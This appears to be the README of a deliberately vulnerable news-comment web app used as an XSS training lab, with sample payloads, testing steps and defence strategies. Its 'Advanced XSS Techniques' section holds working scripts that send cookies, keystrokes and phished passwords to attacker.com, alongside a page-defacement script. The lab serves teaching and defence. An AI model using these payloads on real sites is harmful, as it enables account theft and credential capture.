# XSS News App Lab

## Overview
This lab demonstrates Cross-Site Scripting (XSS) vulnerabilities in a news application's comment system. The application allows users to read news articles and post comments without proper input sanitization.

## Vulnerability
The comment system is vulnerable to both Stored XSS and Reflected XSS attacks:

### Stored XSS in Comments
- **Username field**: User input is displayed without sanitization
- **Comment text field**: User input is displayed without sanitization
- **Impact**: Malicious scripts are stored in the database and executed when other users view the comments

## XSS Payload Examples

### 1. Basic Alert
```html
<script>alert('XSS Test')</script>
```

### 2. Image Tag with OnError
```html
<img src="x" onerror="alert('Image XSS')">
```

### 3. SVG Tag
```html
<svg onload="alert('SVG XSS')">
```

### 4. Iframe
```html
<iframe src="javascript:alert('Iframe XSS')"></iframe>
```

### 5. Input Tag
```html
<input autofocus onfocus="alert('Input XSS')">
```

### 6. Meta Tag Redirect
```html
<meta http-equiv="refresh" content="0;url=javascript:alert('Meta XSS')">
```

### 7. Link Tag
```html
<link rel="import" href="javascript:alert('Link XSS')">
```

## How to Test

### 1. Access the Application
```
http://localhost:8082
```

### 2. Navigate to an Article
Click on any news article to view it and access the comments section.

### 3. Submit Malicious Comments
Use any of the XSS payloads above in either the username or comment fields.

### 4. Observe the XSS Execution
The malicious script will execute when the comment is displayed to other users.

## Advanced XSS Techniques

### 1. Cookie Stealing
```html
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
```

### 2. Keylogging
```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

### 3. Defacing the Page
```html
<script>document.body.innerHTML = '<h1>HACKED!</h1>'</script>
```

### 4. Phishing
```html
<script>
document.body.innerHTML = '<form action="http://attacker.com/steal"><input name="username"><input type="password" name="password"><button type="submit">Login</button></form>';
</script>
```

## Database Structure

### Articles Table
- `id` - Primary key
- `title` - Article title
- `content` - Article content
- `author` - Article author
- `created_at` - Creation timestamp

### Comments Table
- `id` - Primary key
- `article_id` - Foreign key to articles
- `username` - Commenter's name (VULNERABLE)
- `comment_text` - Comment content (VULNERABLE)
- `created_at` - Creation timestamp

## Defense Strategies

### 1. Input Validation
- Validate input length, format, and allowed characters
- Reject suspicious patterns

### 2. Output Encoding
- Use `htmlspecialchars()` for HTML output
- Use `json_encode()` for JavaScript contexts
- Use appropriate encoding for different contexts

### 3. Content Security Policy (CSP)
- Implement CSP headers to restrict script execution
- Whitelist allowed script sources

### 4. HTTP Security Headers
- X-XSS-Protection
- X-Content-Type-Options
- X-Frame-Options

### 5. Sanitization Libraries
- Use HTML Purifier for PHP
- Implement whitelist-based sanitization

## Educational Purpose
This lab is designed for authorized security testing and education only. Do not use these techniques on unauthorized systems.